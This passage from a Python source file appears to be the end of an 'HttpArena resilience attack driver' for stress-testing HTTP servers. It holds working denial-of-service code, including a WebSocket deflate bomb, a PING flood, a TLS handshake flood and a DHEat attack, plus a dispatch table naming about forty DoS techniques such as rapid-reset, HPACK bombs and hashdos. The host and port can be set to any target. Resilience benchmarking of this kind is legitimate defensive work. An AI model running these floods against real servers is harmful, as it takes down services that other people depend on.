    comp = co.compress(b"\x00" * args.bomb_size) + co.flush(zlib.Z_SYNC_FLUSH)
    if comp.endswith(b"\x00\x00\xff\xff"):
        comp = comp[:-4]                       # RFC 7692: strip the deflate tail
    frame = _ws_frame(0x2, comp, fin=True, rsv1=True)

    def body(s, deadline):
        f = nb = 0
        while time.monotonic() < deadline:
            s.sendall(frame); f += 1; nb += len(frame)
            s.settimeout(3)
            try:
                s.recv(65536)
            except socket.timeout:
                pass
        return f, nb
    return _ws_flood_ext(args, body, b"permessage-deflate")


def ws_pong_flood(args):
    # Flood PING frames while never reading: a server that auto-replies PONG and
    # ignores write backpressure grows an unbounded outbound queue (CVE-2026-109932).
    ping = _ws_frame(0x9, b"ping")

    def body(s, deadline):
        f = nb = 0
        while time.monotonic() < deadline:
            s.sendall(ping); f += 1; nb += len(ping)
        return f, nb
    return _ws_flood(args, body)


def _ws_flood_ext(args, body, ext):
    """_ws_flood variant that negotiates a WebSocket extension in the handshake."""
    deadline = time.monotonic() + args.duration
    stats = _new_stats()
    lock = threading.Lock()

    def worker():
        s = None
        try:
            s = _ws_connect(args, extensions=ext)
            with lock:
                stats["established"] += 1
            frames, nbytes = body(s, deadline)
            with lock:
                stats["frames_sent"] += frames
                stats["bytes_sent"] += nbytes
        except OSError:
            with lock:
                stats["reaped"] += 1
        finally:
            if s is not None:
                try:
                    s.close()
                except OSError:
                    pass

    _run_workers(args.conns, deadline, worker)
    return stats


# ── TLS attack toolkit ───────────────────────────────────────────────────────

def _tls_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _tls_handshake_loop(args, ctx):
    """N workers each complete back-to-back TLS handshakes (and immediately drop):
    the server pays the asymmetric crypto; the client barely does. Returns stats
    with handshakes in frames_sent and an `immune` flag when the server rejects
    our offered parameters (e.g. no DHE)."""
    deadline = time.monotonic() + args.duration
    stats = _new_stats()
    lock = threading.Lock()

    def worker():
        hs = 0
        reaped = immune = False
        while time.monotonic() < deadline:
            try:
                raw = socket.create_connection((args.host, args.port), timeout=5)
                ss = ctx.wrap_socket(raw, server_hostname=args.host)
                hs += 1
                ss.close()
            except ssl.SSLError:
                immune = True
                break
            except OSError:
                reaped = True
                break
        with lock:
            if hs:
                stats["established"] += 1
            stats["frames_sent"] += hs
            if reaped:
                stats["reaped"] += 1
            if immune:
                stats["connect_errors"] += 1
    _run_workers(args.conns, deadline, worker)
    return stats


def tls_handshake_flood(args):
    # Many full TLS handshakes as fast as possible: the server signs / derives per
    # handshake; 2 vCPUs saturate (THC-SSL-DOS class).
    return _tls_handshake_loop(args, _tls_ctx())


def dheat(args):
    # Offer only finite-field DHE and flood handshakes: the server must do a full
    # modular exponentiation each time while the client does ~none (CVE-2002-20001).
    # If the server offers no DHE, handshakes fail -> reported as immune.
    ctx = _tls_ctx()
    try:
        ctx.maximum_version = ssl.TLSVersion.TLSv1_2
    except (ValueError, AttributeError):
        pass
    try:
        ctx.set_ciphers("DHE")
    except ssl.SSLError:
        pass
    return _tls_handshake_loop(args, ctx)


ATTACKS = {
    "slow-body": slow_body,
    "slow-headers": slow_headers,
    "huge-chunk": huge_chunk,
    "decompression-bomb": decompression_bomb,
    "continuation-flood": continuation_flood,
    "hpack-bomb": hpack_bomb,
    "rapid-reset": rapid_reset,
    "madeyoureset": madeyoureset,
    "settings-flood": settings_flood,
    "ping-flood": ping_flood,
    "empty-frame-flood": empty_frame_flood,
    "window-stall": window_stall,
    "hashdos": hashdos,
    "json-nesting-bomb": json_nesting_bomb,
    "multipart-flood": multipart_flood,
    "redos-headers": redos_headers,
    "slow-read": slow_read,
    "large-upload": large_upload,
    "keepalive-hoard": keepalive_hoard,
    "content-length-prealloc": content_length_preallocation,
    "expect-100-continue": expect_100_continue_hold,
    "chunk-size-overflow": chunk_size_overflow,
    "trailer-flood": trailer_flood,
    "chunk-extension-flood": chunk_extension_flood,
    "tiny-chunk-flood": tiny_chunk_flood,
    "header-bomb": header_bomb,
    "header-count-flood": header_count_flood,
    "duplicate-header-merge": duplicate_header_merge,
    "pipelining-flood": pipelining_flood,
    "decomp-codec-bypass": decomp_codec_bypass,
    "qvalue-cpu-bomb": qvalue_cpu_bomb,
    "cookie-flood": cookie_flood,
    "percent-decode-quadratic": percent_decode_quadratic,
    "range-bomb": range_bomb,
    "json-bignum": json_bignum,
    "ws-giant-frame": ws_giant_frame,
    "ws-fragment-bomb": ws_fragment_bomb,
    "ws-deflate-bomb": ws_deflate_bomb,
    "ws-pong-flood": ws_pong_flood,
    "tls-handshake-flood": tls_handshake_flood,
    "dheat": dheat,
}


def main():
    p = argparse.ArgumentParser(description="HttpArena resilience attack driver")
    p.add_argument("--attack", required=True, choices=sorted(ATTACKS))
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, required=True)
    p.add_argument("--path", default="/")
    p.add_argument("--conns", type=int, default=1000)
    p.add_argument("--duration", type=float, default=45.0)
    p.add_argument("--drip-interval", type=float, default=1.0, dest="drip_interval")
    p.add_argument("--body-size", type=int, default=10 * 1024 * 1024, dest="body_size")
    p.add_argument("--drip-bytes", type=int, default=1, dest="drip_bytes")
    p.add_argument("--bomb-size", type=int, default=1024 * 1024 * 1024, dest="bomb_size")
    p.add_argument("--hashdos-keys", type=int, default=100000, dest="hashdos_keys")
    p.add_argument("--json-depth", type=int, default=100000, dest="json_depth")
    p.add_argument("--multipart-parts", type=int, default=50000, dest="multipart_parts")
    p.add_argument("--redos-pad", type=int, default=4000, dest="redos_pad")
    p.add_argument("--stall-count", type=int, default=5000, dest="stall_count")
    p.add_argument("--stall-streams", type=int, default=64, dest="stall_streams")
    p.add_argument("--cl-declare", type=int, default=2 * 1024 * 1024 * 1024, dest="cl_declare")
    p.add_argument("--chunk-ext-size", type=int, default=4096, dest="chunk_ext_size")
    p.add_argument("--chunk-count", type=int, default=500000, dest="chunk_count")
    p.add_argument("--header-value-size", type=int, default=1024 * 1024, dest="header_value_size")
    p.add_argument("--header-count", type=int, default=50000, dest="header_count")
    p.add_argument("--dup-headers", type=int, default=20000, dest="dup_headers")
    p.add_argument("--pipeline-depth", type=int, default=10000, dest="pipeline_depth")
    p.add_argument("--upload-size", type=int, default=2 * 1024 * 1024 * 1024, dest="upload_size")
    p.add_argument("--qvalue-count", type=int, default=5000, dest="qvalue_count")
    p.add_argument("--cookie-pairs", type=int, default=100000, dest="cookie_pairs")
    p.add_argument("--percent-count", type=int, default=2000, dest="percent_count")
    p.add_argument("--range-count", type=int, default=1000, dest="range_count")
    p.add_argument("--bignum-digits", type=int, default=100000, dest="bignum_digits")
    p.add_argument("--ws-frame-len", type=int, default=(1 << 63) - 256, dest="ws_frame_len")
    p.add_argument("--ws-frag-size", type=int, default=4096, dest="ws_frag_size")
    p.add_argument("--tls", action="store_true")
    args = p.parse_args()

    started = time.monotonic()
    result = ATTACKS[args.attack](args)
    result["attack"] = args.attack
    result["conns_requested"] = args.conns
    result["elapsed_s"] = round(time.monotonic() - started, 2)
    json.dump(result, sys.stdout)
    sys.stdout.write("\n")


if __name__ == "__main__":
    main()
